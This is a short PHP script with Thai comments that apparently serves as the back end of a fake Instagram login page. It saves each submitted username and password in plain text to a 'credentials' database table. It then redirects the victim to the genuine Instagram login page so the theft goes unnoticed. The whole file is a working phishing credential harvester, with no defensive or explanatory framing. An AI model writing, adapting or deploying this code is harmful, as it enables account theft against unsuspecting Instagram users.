<?php
require 'connect.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // ป้องกัน SQL Injection แบบง่าย (ควรใช้ prepared statement จริงๆ)
    $stmt = $conn->prepare("INSERT INTO credentials (username, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $username, $password);
    $stmt->execute();
    $stmt->close();

    // redirect ไปหน้า Instagram จริง
    header('Location: https://www.instagram.com/accounts/login/');
    exit;
}
?>
